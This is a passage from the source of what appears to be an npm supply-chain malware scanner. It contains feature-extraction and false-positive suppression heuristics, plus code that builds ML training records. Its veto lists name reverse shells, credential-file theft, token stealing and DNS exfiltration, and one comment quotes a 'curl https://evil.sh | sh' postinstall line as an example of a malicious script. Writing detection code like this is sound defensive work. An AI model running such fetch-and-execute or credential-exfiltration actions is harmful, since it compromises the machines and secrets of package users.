  // first-party endpoint is intrinsic to MCP installers — see F9/F14)
  for (const t of threats) {
    if (HARD_EXFIL_TYPES.has(t.type)) return false;
  }
  return true;
}

// ============================================================================
// Feature 10 — vendor_cli_sdk (v2.11.23, audit week3 cluster, 96 FP)
// ============================================================================
//
// Targets the largest residual FP cluster from the audit 2026-05-week3
// (96 entries, 33.6% of FP): legitimate vendor / community CLIs and SDKs
// that fire `credential_regex_harvest` + `env_access` on their OWN
// in-package credential handling (Stripe checkout, OAuth-PKCE, bearer
// tokens to vendor APIs, .env template scaffolding). Examples observed:
// @nocobase/cli-v1, @posterly/cli, @super-hands/cli, codeapp-js-cli
// (Microsoft Power Apps), nodebb-plugin-flawless-donations (Stripe),
// @aiyiran/myclaw (Chinese OpenClaw wrapper), usegrain (scaffolder),
// @tapestry-mud/cli, db-model-router, etc.
//
// Discriminator vs vendor-impersonating malware: SANDWORM_MODE droppers
// (a) typically have no `bin` entry (they install via lifecycle hook,
// not user-invoked CLI), (b) emit `mcp_config_injection` (F9 catches
// those), (c) cite credential file paths (.npmrc / .ssh / .aws), (d)
// emit third-party exfil threats. F10's conjunction requires NONE of
// these and additionally requires a vendor identity hint (homepage or
// scoped name).

function _f10HasBinEntry(meta) {
  const bin = meta && meta.registryMeta && meta.registryMeta.bin;
  if (!bin) return false;
  if (typeof bin === 'string' && bin.trim().length > 0) return true;
  if (typeof bin === 'object' && Object.keys(bin).length > 0) return true;
  return false;
}

function _f10HasVendorIdentity(meta) {
  if (!meta) return false;
  if (getHomepageHost(meta)) return true;
  const name = meta.name && String(meta.name);
  if (name && name.startsWith('@') && name.includes('/')) return true;
  return false;
}

/**
 * Feature 10 — TRUE iff the package looks structurally like a legitimate
 * vendor / community CLI / SDK whose credential-handling threats are
 * intrinsic to its functionality, not an exfil vector.
 *
 * Conjunction of 7 conditions (see file header for SANDWORM_MODE
 * discriminator rationale):
 *
 *   C1  has `bin` entry                       — CLI signal
 *   C2  credential_regex_harvest OR env_access fires
 *   C3  no `mcp_config_injection`             — F9 catches MCP installers
 *   C4  no install lifecycle hook             — legit CLIs are opt-in
 *   C5  no third-party exfil threat (15 types)
 *   C6  no credential file path (.npmrc/.ssh/.aws) in any threat message
 *   C7  vendor identity present (homepage host OR scoped @vendor/name)
 *
 * Cap value 35 (CRITICAL → MEDIUM-HIGH boundary). Reuses the F9 constants
 * F9_EXFIL_TYPES and F9_CREDENTIAL_FILE_RE for C5/C6.
 *
 * Covers up to 96 FP (33.6% of audit week3 FP corpus). Estimated effective
 * coverage 60-75 after the conjunction filters (some week3 entries lack
 * a bin field, e.g. design-system asset packages — those fall under F1
 * `bundle_without_install_scripts` instead).
 */
function vendorCliSdk(result, meta) {
  // C1 — has bin entry
  if (!_f10HasBinEntry(meta)) return false;
  const threats = (result && result.threats) || [];
  if (threats.length === 0) return false;
  // C2 — at least one credential-noise threat (the FP source)
  const hasCredentialNoise = threats.some(t =>
    t.type === 'credential_regex_harvest' ||
    t.type === 'env_access' ||
    t.type === 'env_charcode_reconstruction' ||
    t.type === 'credential_tampering'
  );
  if (!hasCredentialNoise) return false;
  // C3 — no mcp_config_injection (F9 territory)
  if (threats.some(t => t.type === 'mcp_config_injection')) return false;
  // C4 — no install lifecycle hook
  if (hasLifecycleScripts(meta)) return false;
  // C5 + C6 — scan threats for HARD exfil signal and credential-file
  // mentions. v2.11.31 F14: SOFT compound intent threats (suspicious_dataflow,
  // intent_*, detached_credential_exfil) no longer disqualify C5 — a legit
  // vendor CLI does env_read + POST own API endpoint, which trips those
  // compounds without being malicious. HARD signals (suspicious_domain,
  // binary_dropper, remote_code_load, external_tarball_dep, etc.) remain.
  for (const t of threats) {
    if (HARD_EXFIL_TYPES.has(t.type)) return false;       // C5
    if (F9_CREDENTIAL_FILE_RE.test(String(t.message || ''))) return false;  // C6
  }
  // C7 — vendor identity
  if (!_f10HasVendorIdentity(meta)) return false;
  return true;
}

// ============================================================================
// Feature 11 — ai_agent_bot (v2.11.24, audit week3 cluster, 54 FP)
// ============================================================================
//
// Targets the third cluster from the audit 2026-05-week3 (54 entries,
// 18.9 % of FP): packages that ARE themselves multi-provider AI agents,
// orchestrators, chatbots, or IM⇄AI bridges. Examples: gm-skill (AI coding
// harness), codexmate (multi-provider orchestrator), lazyclaw (terminal
// multi-LLM CLI), linco-connect (WeChat→Claude bridge), natureco-cli
// (WhatsApp+Telegram bot), multis (Telegram chatbot), @aitne-sh/aitne
// (personal AI daemon), @jhizzard/termdeck (browser term mux with AI),
// triflux (Claude Code router), opuscode (Claude config wizard).
//
// These packages legitimately fire `dangerous_call_eval` (LLM tool-use
// execute_code feature), `remote_code_load` (bun x pkg@latest fetching),
// `detached_credential_exfil` (local session token storage), and lots
// of `env_access` + `suspicious_dataflow`. F11 cannot blacklist these —
// they ARE the core capabilities. Instead the conjunction requires:
//
//   - Positive AI agent identity (name/desc/keywords/deps signal)
//   - Evidence the package operates on agent runtime data (touches paths
//     like ~/.claude/, ~/.codex/, ~/.cursor/, etc.)
//   - Absence of SANDWORM_MODE signatures: no preinstall, no
//     mcp_config_injection (F9 priority), no third-party suspicious_domain,
//     no credential file harvest, no binary dropper (F2 priority).
//
// Cap 35 (aligned with F10 — broader conjunction than F9).

// Agent runtime directory regex — matches references in threat messages to
// AI tool runtime paths. Both '~/.X/' and 'os.homedir() + "/.X"' patterns
// surface as substrings here.
const AGENT_RUNTIME_PATHS_RE = /[~/\\\\]\.(?:claude|codex|cursor|windsurf|continue|openclaude|openclaudia|hermes|aiflow|tdpilot|aitne|kimi|opuscode|freddie|gm-?log|gm-?skill|termdeck|relaydesk|natureco|grok|gemini|copilot|cline|aider|cody|tabnine|cursor-ai|cursorrules|claude-?desktop|claude-?code|llm[- ]?cache)\b/i;

// AI agent name regex — package name signals identity.
const AGENT_NAME_RE = /(?:^|[/_-])(?:agent|bot|chat|chatbot|claw|codex|coder|swarm|harness|brain|orchestr|orchestrator|claude|llm|hermes|aider|kimi|cline|cody|aitne|opuscode|relaydesk|termdeck|gm-skill|gm-hermes|gm-qwen|gm-thebird|gm-plugkit|relipa|triflux|protocol-proxy|codexmate|lazy?claw|natureco)(?:[_-]|$)/i;

// Keywords that signal AI agent purpose (case-insensitive).
const AGENT_KEYWORDS_SET = new Set([
  'agent', 'ai', 'llm', 'chatbot', 'bot', 'claude', 'codex',
  'cursor', 'copilot', 'ollama', 'openai', 'anthropic', 'gemini',
  'multi-llm', 'multi-provider', 'orchestrator', 'coding-agent',
  'ai-agent', 'llm-agent', 'mcp-agent'
]);

// Description regex — matches agent purpose phrases.
const AGENT_DESC_RE = /\b(?:ai|llm|claude|codex|gemini|openai|anthropic|ollama)[ -]?(?:agent|bot|chatbot|orchestrator|harness|cli|assistant|coding[ -]?agent|gateway|relay|router|harness|workspace)\b|\bmulti[ -]?provider\b|\bcoding[ -]?agent\b|\bagent[ -]?(?:bridge|router|orchestrator)\b|telegram[ -]?(?:bot|bridge)|whatsapp[ -]?(?:bot|bridge)|wechat[ -]?(?:bot|bridge)/i;

// Dependency names that signal AI agent / bot framework usage.
const AGENT_DEPS = new Set([
  '@anthropic-ai/sdk', '@anthropic-ai/claude-code', '@openai/agents', 'openai',
  '@google/genai', '@google/generative-ai', 'ai', 'ollama', 'groq-sdk',
  'telegraf', 'node-telegram-bot-api', '@whiskeysockets/baileys',
  'whatsapp-web.js', 'discord.js', 'eventsource', 'node-pty',
  '@anthropic-ai/bedrock-sdk', '@openai/realtime-api-beta'
]);

function _f11HasAgentIdentity(meta) {
  if (!meta) return false;
  const name = String(meta.name || '');
  if (AGENT_NAME_RE.test(name)) return true;
  const r = (meta.registryMeta || {});
  const desc = r.description || meta.description || '';
  if (AGENT_DESC_RE.test(desc)) return true;
  if (Array.isArray(r.keywords)) {
    for (const k of r.keywords) {
      if (AGENT_KEYWORDS_SET.has(String(k).toLowerCase())) return true;
    }
  }
  const deps = r.dependencies || meta.dependencies;
  if (deps && typeof deps === 'object') {
    for (const d of Object.keys(deps)) {
      if (AGENT_DEPS.has(d)) return true;
    }
  }
  return false;
}

function _f11HasAgentPathReference(threats) {
  for (const t of threats) {
    const msg = String(t.message || '');
    if (AGENT_RUNTIME_PATHS_RE.test(msg)) return true;
    // Also accept the threat's file field — sometimes the path leaks via the
    // file location rather than the message body.
    const file = String(t.file || '');
    if (AGENT_RUNTIME_PATHS_RE.test(file)) return true;
  }
  return false;
}

/**
 * Feature 11 — TRUE iff the package self-identifies as an AI agent / bot /
 * multi-LLM orchestrator AND demonstrably operates on AI tool runtime
 * data (~/.claude/, ~/.codex/, ~/.cursor/, etc.) AND lacks the
 * SANDWORM_MODE / vendor-impersonation signatures.
 *
 * Conjunction of 7 conditions:
 *
 *   C1  AI agent identity (name|desc|keywords|deps signal)
 *   C2  no install lifecycle hook
 *   C3  no `mcp_config_injection` (F9 priority)
 *   C4  no `suspicious_domain` threat (third-party exfil discriminator)
 *   C5  no credential file path in any threat message (reuse F9 regex)
 *   C6  >=1 threat references an agent runtime path (positive operating signal)
 *   C7  no `binary_dropper` / `download_exec_binary` (F2 priority)
 *
 * Cap 35. Same cap as F10 (broader conjunction than F9). Reuses
 * `F9_CREDENTIAL_FILE_RE` from v2.11.22.
 *
 * Discriminator vs malware:
 *   - SANDWORM droppers use preinstall/postinstall (C2 blocks).
 *   - MCP-impersonating malware emits mcp_config_injection (C3 → F9).
 *   - Exfilers have suspicious_domain (C4 blocks).
 *   - Binary droppers (C7 → F2 territory).
 *   - Credential file harvesters (C5 blocks).
 *
 * Covers up to 54 FP (18.9% of audit week3). Effective estimated coverage
 * 30-40 (55-75%): the rest lack agent runtime path references or fire on
 * suspicious_domain due to Chinese model rerouting (yingclaw pattern).
 */
function aiAgentBot(result, meta) {
  // C1 — identity
  if (!_f11HasAgentIdentity(meta)) return false;
  const threats = (result && result.threats) || [];
  if (threats.length === 0) return false;
  // C2 — no install lifecycle hook
  if (hasLifecycleScripts(meta)) return false;
  // C3 — no mcp_config_injection (F9 priority)
  for (const t of threats) {
    if (t.type === 'mcp_config_injection') return false;
  }
  // C4 + C7 — v2.11.31 F14: unify hard-exfil veto across F9/F10/F11.
  // Pre-F14 F11 only blocked on suspicious_domain / binary_dropper /
  // download_exec_binary; now also blocks on remote_code_load (slopsquat
  // staging), external_tarball_dep (non-npm dep), dependency_url_suspicious
  // (attacker-controlled dep URL), curl_*/reverse_shell (shell exfil),
  // dns_exfil + blockchain_c2_resolution (covert egress), fetch_decrypt_exec
  // (multistage). Soft compound intents still don't disqualify here.
  for (const t of threats) {
    if (HARD_EXFIL_TYPES.has(t.type)) return false;
  }
  // C5 — no credential file path in any message
  for (const t of threats) {
    if (F9_CREDENTIAL_FILE_RE.test(String(t.message || ''))) return false;
  }
  // C6 — at least one threat references an agent runtime path
  if (!_f11HasAgentPathReference(threats)) return false;
  return true;
}

// ============================================================================
// Feature 12 — vendor_minified_bundle (v2.11.27, weekly review 2026-05-22, 9 FP)
// ============================================================================
//
// Targets the @photoroom/ui (1.8MB UMD bundle, 6 cascade types) and
// @vkontakte/videoplayer-shared (32KB min, 4 cascade types) cluster: vendor
// React/JS bundles where webpack/rollup/esbuild output legitimately produces
// `eval`, `new Function`, prototype mutations for framework reactivity,
// `Proxy({set/get})` interceptors, credential-regex-looking strings, and
// minified blobs that trip the obfuscation heuristic. Per-file co-occurrence
// of >=3 of those patterns on a path matching BUNDLE_PATH_RE is the signal.
//
// Complements F1 (bundleWithoutInstallScripts, cap 30) which requires ALL
// threat files to exceed 100KB and ALL threats to carry t.file — both
// conditions are too strict for the v2.11.27 cluster (vkontakte is 32KB; the
// cluster co-occurs with package-level `intent_credential_exfil` for some
// packages). F12 uses a 20KB floor per cascade file and an explicit C3
// veto on package-level exfil intents instead of disqualifying outright.

const CASCADE_TYPES = new Set([
  'credential_regex_harvest',     // MUADDIB-AST-041
  'dangerous_call_eval',          // MUADDIB-AST-004
  'dangerous_call_function',      // MUADDIB-AST-005
  'prototype_pollution',          // MUADDIB-AST-065
  'proxy_data_intercept',         // MUADDIB-AST-043
  'remote_code_load',             // MUADDIB-AST-040
  'obfuscation_detected',         // src/scanner/obfuscation.js
  'js_obfuscation_pattern',
  // FPR audit 2026-06: these two also fire on legitimate minified vendor bundles
  // (string-rewrite tables, base64 blobs) and were escaping the bundle cap.
  'string_mutation_obfuscation',
  'high_entropy_string'
]);
const CASCADE_MIN_TYPES = 3;
const CASCADE_MIN_FILE_BYTES = 20 * 1024;

/**
 * Feature 12 — TRUE iff the package ships at least one minified vendor
 * bundle file with >=3 distinct CASCADE_TYPES firing on it AND has no
 * install lifecycle script AND no veto signal AND no package-level exfil
 * intent.
 *
 * Discriminator vs malware injected into a bundle:
 *   - hasBundleVetoSignal (src/shared/bundle-detect.js) catches reverse_shell,
 *     node_modules_write, npm_publish_worm, npm_token_steal, systemd_persistence,
 *     unicode_invisible_injection (GlassWorm), ioc_match,
 *     known_malicious_package, shai_hulud_marker, detached_credential_exfil,
 *     ai_config_injection, ide_task_persistence, plus env_access on
 *     SENSITIVE_ENV_RE (NPM_TOKEN, AWS_*, SSH_*, etc.).
 *   - C3 catches Axios UNC1069-style package-level intent_credential_exfil /
 *     intent_command_exfil (no `t.file` → not file-scoped → real campaign).
 *   - C2 (no lifecycle) catches postinstall droppers.
 *   - C7 (20KB floor) catches hand-written 4KB eval injections in dist/.
 *
 * Cap 25 (MEDIUM). Tighter than F1=30: the cascade of >=3 bundler-emitted
 * heuristics on a single file is a stronger structural bundler signature
 * than "any large file with no install hook".
 */
function vendorMinifiedBundle(result, meta) {
  if (!meta || !meta.registryMeta || meta.registryMeta.scripts === undefined) return false;
  if (hasLifecycleScripts(meta)) return false;

  const threats = (result && result.threats) || [];
  if (threats.length === 0) return false;

  // C3 — package-level exfil intent disqualifies (real campaign signal,
  // not bundler artifact: bundlers never produce intent threats without
  // a backing file).
  for (const t of threats) {
    if ((t.type === 'intent_credential_exfil' || t.type === 'intent_command_exfil') && !t.file) {
      return false;
    }
  }

  const summary = (result && result.summary) || {};
  const fileSizes = summary.fileSizes || {};
  const typesByFile = new Map();

  for (const t of threats) {
    if (!t.file || !CASCADE_TYPES.has(t.type)) continue;
    if (!SHARED_BUNDLE_PATH_RE.test(t.file) && !BUNDLE_FILE_RE.test(t.file)) continue;
    if (!typesByFile.has(t.file)) typesByFile.set(t.file, new Set());
    typesByFile.get(t.file).add(t.type);
  }

  for (const [file, types] of typesByFile) {
    if (types.size < CASCADE_MIN_TYPES) continue;
    if (hasBundleVetoSignal(threats, file)) continue;
    const size = fileSizes[file];
    if (typeof size === 'number' && size < CASCADE_MIN_FILE_BYTES) continue;
    return true;
  }
  return false;
}

// ============================================================================
// Feature 13 — typosquat_benign_lifecycle (v2.11.28, weekly review 2026-05-22, 9 FP)
// ============================================================================
//
// Targets the dependency_typosquat boundary-squat cluster (Axios UNC1069 rule
// RT-C1 fired in March 2026 + RT-C1-FPR audit 2026-05). The boundary-squat
// scanner emits `dependency_typosquat` MEDIUM on any sub-dep matching
// `<prefix>-<popular>` or `<popular>-<suffix>` when the extra token is not in
// LEGIT_BOUNDARY_TOKENS. The compound `typosquat_lifecycle` (CRITICAL,
// src/scoring.js:517-523) escalates it to CRITICAL whenever a lifecycle hook
// is present — including provably benign ones like `husky install`,
// `npm run build`, or `node patches/apply-patches.js` (balena-cli pattern).
//
// F13 suppresses that compound's contribution when all lifecycle scripts are
// provably benign AND no real exfil / IOC / `dependency_typosquat_used`
// signal is present. The Axios UNC1069 discriminator (require()d sub-dep)
// emits dependency_typosquat_used + the dependency_typosquat_require
// compound — both vetoed in F13_VETO_TYPES.
//
// Reuses `isSafeLifecycleScript` from src/monitor/temporal.js:53 (covers
// `npm run build`, `tsc`, `eslint`, etc.) and extends it with audit-observed
// patterns: husky install, simple-git-hooks, patch-package,
// `node patches/apply-patches.js`, is-ci || X guard.

const { isSafeLifecycleScript } = require('../monitor/temporal.js');

const F13_BENIGN_SCRIPT_RE = /^(?:is-ci\s*\|\|\s*)?(?:husky(?:\s+install)?|simple-git-hooks|patch-package|node\s+patches\/apply-patches\.js|npm\s+run\s+build(?::[a-z0-9_-]+)?)\s*$/i;

function isBenignLifecycleScript(value) {
  if (!value || typeof value !== 'string') return false;
  if (isSafeLifecycleScript(value)) return true;
  return value.trim().split(/\s*&&\s*/).every(cmd => F13_BENIGN_SCRIPT_RE.test(cmd.trim()));
}

const F13_VETO_TYPES = new Set([
  // Egress / exfil — any real network capability is a campaign signal
  'suspicious_dataflow', 'suspicious_domain', 'remote_code_load', 'curl_exec',
  'intent_credential_exfil', 'intent_command_exfil', 'fetch_decrypt_exec',
  'reverse_shell', 'binary_dropper', 'download_exec_binary',
  'curl_env_exfil', 'external_tarball_dep', 'dependency_url_suspicious',
  'blockchain_c2_resolution', 'dns_exfil',
  // Worm propagation (Shai-Hulud)
  'npm_publish_worm', 'node_modules_write', 'npm_token_steal',
  // IOC hits
  'ioc_match', 'known_malicious_package', 'shai_hulud_marker', 'ioc_string_match',
  // DPRK / mini Shai-Hulud 2026-05
  'detached_credential_exfil', 'ai_config_injection', 'ide_task_persistence',
  // Axios UNC1069 discriminator: dep is require()d in code
  'dependency_typosquat_used', 'dependency_typosquat_require'
]);

const F13_LIFECYCLE_KEYS = ['preinstall', 'install', 'postinstall', 'prepare'];

/**
 * Feature 13 — TRUE iff the package shows the compound `typosquat_lifecycle`
 * (boundary-squat dep + lifecycle hook) AND every declared lifecycle script
 * is provably benign AND no exfil / IOC / dep-usage signal is present.
 *
 * Discriminator vs malware:
 *   - Axios UNC1069 wrappers emit `dependency_typosquat_used` (the dep is
 *     require()d in source) + compound `dependency_typosquat_require` → veto.
 *   - Shai-Hulud worm emits `npm_publish_worm`, `node_modules_write`,
 *     `npm_token_steal` → veto.
 *   - GlassWorm / DPRK emit `unicode_invisible_injection` (downstream
 *     irrelevant — caught at scanner severity)/ `detached_credential_exfil`
 *     / `ai_config_injection` / `ide_task_persistence` → veto.
 *   - Real install-time droppers carry suspicious_dataflow / suspicious_domain
 *     / remote_code_load / curl_exec / intent_*_exfil → veto.
 *   - Hand-crafted `curl https://evil.sh | sh` postinstall fails
 *     isBenignLifecycleScript → veto.
 *
 * Targets the v2.11.28 weekly review 2026-05-22 cluster:
 *   - @doyourjob/gravity-ui-page-constructor (prepare: husky install)
 *   - balena-cli (postinstall: node patches/apply-patches.js)
 *   - magmastream (prepare: npm run build)
 *   - @1d1s/design-system (prepare: npm run build:lib)
 *   - @healthcare-interoperability/fhir-storage-core (prepare: npm run build)
 *   - @quicore/problem-details-error (prepare: npm run build)
 *
 * Cap 30 (MEDIUM). Matches the F9 (mcp_server_env_access) cap because both
 * suppress a compound-driven CRITICAL into the residual MEDIUM signal.
 */
function typosquatBenignLifecycle(result, meta) {
  const threats = (result && result.threats) || [];
  if (!threats.some(t => t.type === 'dependency_typosquat' || t.type === 'typosquat_detected')) return false;
  if (!threats.some(t => t.type === 'lifecycle_script')) return false;
  if (!threats.some(t => t.type === 'typosquat_lifecycle')) return false;

  for (const t of threats) {
    if (F13_VETO_TYPES.has(t.type)) return false;
  }

  const scripts = (meta && meta.registryMeta && meta.registryMeta.scripts) || null;
  if (!scripts || typeof scripts !== 'object') return false;

  let sawScript = false;
  for (const key of F13_LIFECYCLE_KEYS) {
    const v = scripts[key];
    if (typeof v !== 'string' || v.trim().length === 0) continue;
    sawScript = true;
    if (!isBenignLifecycleScript(v)) return false;
  }
  return sawScript;
}

/**
 * Feature 8 — TRUE iff the package declares at least one install
 * lifecycle script AND the scan shows no network egress capability
 * anywhere (no fetch/curl/dns/suspicious dataflow/drop-exec).
 *
 * Install scripts that only do `echo`, `mkdir`, `chmod`, `npm run
 * build`, or call a local node script without network access cannot
 * exfiltrate data — the 219 FP this covers are almost entirely build
 * helpers and version/engine gates.
 *
 * Mutually exclusive with F1 (requires no install) and F2 (requires
 * a binary downloader, hence network egress).
 */
function installScriptNoNetworkEgress(result, meta) {
  if (!hasInstallScript(meta)) return false;
  const threats = (result && result.threats) || [];
  for (const t of threats) {
    if (EGRESS_TYPES.has(t.type)) return false;
  }
  return true;
}

/**
 * Extract ML features from a scan result object.
 *
 * @param {Object} result - scan result from run() with { threats, summary }
 * @param {Object} meta - package metadata { name, version, ecosystem, unpackedSize, registryMeta }
 * @returns {Object} flat feature vector with numeric/boolean values
 */
function extractFeatures(result, meta) {
  const features = Object.create(null);
  const threats = (result && result.threats) || [];
  const summary = (result && result.summary) || {};

  // --- Scoring features ---
  features.score = summary.riskScore || 0;
  features.max_file_score = summary.maxFileScore || 0;
  features.package_score = summary.packageScore || 0;
  features.global_risk_score = summary.globalRiskScore || 0;

  // --- Severity counts ---
  features.count_total = summary.total || 0;
  features.count_critical = summary.critical || 0;
  features.count_high = summary.high || 0;
  features.count_medium = summary.medium || 0;
  features.count_low = summary.low || 0;

  // --- Distinct threat types ---
  const distinctTypes = new Set(threats.map(t => t.type));
  features.distinct_threat_types = distinctTypes.size;

  // --- Per-type counts (top 47 types) ---
  const typeCounts = Object.create(null);
  for (const t of threats) {
    typeCounts[t.type] = (typeCounts[t.type] || 0) + 1;
  }
  for (const type of TOP_THREAT_TYPES) {
    features[`type_${type}`] = typeCounts[type] || 0;
  }
  // Aggregate count for types not in top list
  let otherCount = 0;
  for (const [type, count] of Object.entries(typeCounts)) {
    if (!TOP_THREAT_TYPES_SET.has(type)) {
      otherCount += count;
    }
  }
  features.type_other = otherCount;

  // --- Boolean behavioral signals ---
  features.has_lifecycle_script = threats.some(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe') ? 1 : 0;
  features.has_network_access = threats.some(t =>
    t.type === 'network_require' || t.type === 'remote_code_load' ||
    t.type === 'curl_exec' || t.type === 'suspicious_dataflow'
  ) ? 1 : 0;
  features.has_obfuscation = threats.some(t =>
    t.type === 'obfuscation_detected' || t.type === 'high_entropy_string' ||
    t.type === 'js_obfuscation_pattern'
  ) ? 1 : 0;
  features.has_env_access = threats.some(t => t.type === 'env_access' || t.type === 'env_charcode_reconstruction') ? 1 : 0;
  features.has_eval = threats.some(t => t.type === 'dangerous_call_eval' || t.type === 'dangerous_call_function') ? 1 : 0;
  features.has_staged_payload = threats.some(t => t.type === 'staged_payload' || t.type === 'staged_binary_payload') ? 1 : 0;
  features.has_typosquat = threats.some(t => t.type === 'typosquat_detected' || t.type === 'pypi_typosquat_detected') ? 1 : 0;
  // has_ioc_match excluded from ML classification (always 0) to prevent circular
  // leakage: auto-labeler uses IOC signals for "confirmed_malicious" labels, so
  // training on has_ioc_match would learn "IOC = malicious" instead of behavioral
  // patterns. IOC matching is already handled by scoring rules independently.
  features.has_ioc_match = 0;
  features.has_intent_pair = threats.some(t => t.type === 'intent_credential_exfil' || t.type === 'intent_command_exfil') ? 1 : 0;
  features.has_sandbox_finding = threats.some(t => t.type && t.type.startsWith('sandbox_')) ? 1 : 0;

  // --- File distribution features ---
  const fileScores = summary.fileScores || {};
  const fileScoreValues = Object.values(fileScores);
  features.file_count_with_threats = fileScoreValues.length;
  features.file_score_mean = fileScoreValues.length > 0
    ? Math.round(fileScoreValues.reduce((a, b) => a + b, 0) / fileScoreValues.length)
    : 0;
  features.file_score_max = fileScoreValues.length > 0
    ? Math.max(...fileScoreValues)
    : 0;

  // --- Severity concentration: ratio of CRITICAL+HIGH vs total ---
  features.severity_ratio_high = features.count_total > 0
    ? Math.round(((features.count_critical + features.count_high) / features.count_total) * 100) / 100
    : 0;

  // --- Points concentration: max single-threat points vs score ---
  const breakdown = summary.breakdown || [];
  features.max_single_points = breakdown.length > 0 ? breakdown[0].points : 0;
  features.points_concentration = features.score > 0 && breakdown.length > 0
    ? Math.round((breakdown[0].points / features.score) * 100) / 100
    : 0;

  // --- Package metadata (from registry) ---
  const registry = (meta && meta.registryMeta) || {};
  features.unpacked_size_bytes = (meta && meta.unpackedSize) || registry.unpackedSize || 0;
  features.dep_count = countDeps(registry.dependencies);
  features.dev_dep_count = countDeps(registry.devDependencies);

  // --- Reputation factor (if computed by monitor) ---
  features.reputation_factor = summary.reputationFactor || 1.0;

  // --- Enriched registry/package metadata (Phase 2a) ---
  const npmMeta = (meta && meta.npmRegistryMeta) || {};
  features.package_age_days = npmMeta.age_days || 0;
  features.weekly_downloads = npmMeta.weekly_downloads || 0;
  features.version_count = npmMeta.version_count || 0;
  features.author_package_count = npmMeta.author_package_count || 0;
  features.has_repository = npmMeta.has_repository ? 1 : 0;
  features.readme_size = npmMeta.readme_size || 0;
  features.file_count_total = (meta && meta.fileCountTotal) || 0;
  features.has_tests = (meta && meta.hasTests) ? 1 : 0;
  features.threat_density = features.file_count_with_threats > 0
    ? Math.round((features.count_total / features.file_count_with_threats) * 100) / 100
    : 0;

  // --- Cluster FP contextual features (v2.10.96) ---
  features.network_destination_first_party = networkDestinationFirstParty(result, meta) ? 1 : 0;
  features.install_url_github_releases = installUrlGithubReleases(result) ? 1 : 0;
  features.bundle_without_install_scripts = bundleWithoutInstallScripts(result, meta) ? 1 : 0;
  features.git_hook_source_local = gitHookSourceLocal(result) ? 1 : 0;
  features.typosquat_scoped_package = typosquatScopedPackage(result, meta) ? 1 : 0;
  features.obfuscation_without_vector = obfuscationWithoutVector(result) ? 1 : 0;
  features.placeholder_anti_dep_confusion = placeholderAntiDepConfusion(result, meta) ? 1 : 0;
  // F8 disabled for retrain — fires on malware due to incomplete EGRESS_TYPES
  // (missing dangerous_exec, lifecycle_dangerous_exec, node_inline_exec).
  // Re-enable in v2.10.97 after EGRESS_TYPES fix + re-validation.
  // See ml-retrain/ml-auc-v2.10.96.md for details.
  features.install_script_no_network_egress = 0; // installScriptNoNetworkEgress(result, meta) ? 1 : 0;

  // --- v2.11.22 Feature 9 (audit week3 cluster — 25 FP) ---
  features.mcp_server_env_access = mcpServerEnvAccess(result, meta) ? 1 : 0;
  // --- v2.11.23 Feature 10 (audit week3 cluster — up to 96 FP) ---
  features.vendor_cli_sdk = vendorCliSdk(result, meta) ? 1 : 0;
  // --- v2.11.24 Feature 11 (audit week3 cluster — up to 54 FP) ---
  features.ai_agent_bot = aiAgentBot(result, meta) ? 1 : 0;

  return features;
}

/**
 * Count dependencies from a registry metadata dependencies object.
 * Handles both object format ({name: version}) and number.
 */
function countDeps(deps) {
  if (!deps) return 0;
  if (typeof deps === 'number') return deps;
  if (typeof deps === 'object') return Object.keys(deps).length;
  return 0;
}

/**
 * Build a complete JSONL record for a scanned package.
 *
 * @param {Object} result - scan result from run()
 * @param {Object} params - { name, version, ecosystem, unpackedSize, registryMeta, label, tier, sandboxResult }
 * @returns {Object} complete record with metadata + features + label
 */
function buildTrainingRecord(result, params) {
  const {
    name, version, ecosystem,
    unpackedSize, registryMeta,
    npmRegistryMeta, fileCountTotal, hasTests,
    label, tier, sandboxResult
  } = params;

  const features = extractFeatures(result, {
    name, version, ecosystem,
    unpackedSize, registryMeta,
    npmRegistryMeta, fileCountTotal, hasTests
  });

  const record = Object.create(null);

  // --- Identity (not features, for traceability) ---
  record.name = name || '';
  record.version = version || '';
  record.ecosystem = ecosystem || 'npm';
  record.timestamp = new Date().toISOString();

  // --- Label ---
  // 'clean' = no findings or T3 only
  // 'suspect' = T1/T2 (pending manual review)
  // 'unconfirmed' = sandbox clean, not manually reviewed (default for automated relabeling)
  // 'confirmed' = manually confirmed malicious
  // 'fp' = manually confirmed false positive (requires manualReview=true)
  record.label = label || 'suspect';
  record.tier = tier || null;

  // --- Features ---
  Object.assign(record, features);

  // --- Sandbox score (if available) ---
  record.sandbox_score = (sandboxResult && sandboxResult.score) || 0;
  record.sandbox_finding_count = (sandboxResult && sandboxResult.findings)
    ? sandboxResult.findings.length
    : 0;

  return record;
}

module.exports = {
  extractFeatures,
  buildTrainingRecord,
  TOP_THREAT_TYPES,
  TOP_THREAT_TYPES_SET,
  // Exported for direct unit testing of the cluster-FP helpers.
  networkDestinationFirstParty,
  installUrlGithubReleases,
  bundleWithoutInstallScripts,
  gitHookSourceLocal,
  typosquatScopedPackage,
  obfuscationWithoutVector,
  placeholderAntiDepConfusion,
  installScriptNoNetworkEgress,
  mcpServerEnvAccess,
  mcpServerBenignLifecycle,
  vendorCliSdk,
  aiAgentBot,
  vendorMinifiedBundle,
  typosquatBenignLifecycle,
  isBenignLifecycleScript,
  // v2.11.31 F14: exposed so audit scripts can introspect the HARD/SOFT
  // classification when triaging cluster FPs.
  HARD_EXFIL_TYPES,
  SOFT_EXFIL_TYPES,
  F9_EXFIL_TYPES
};
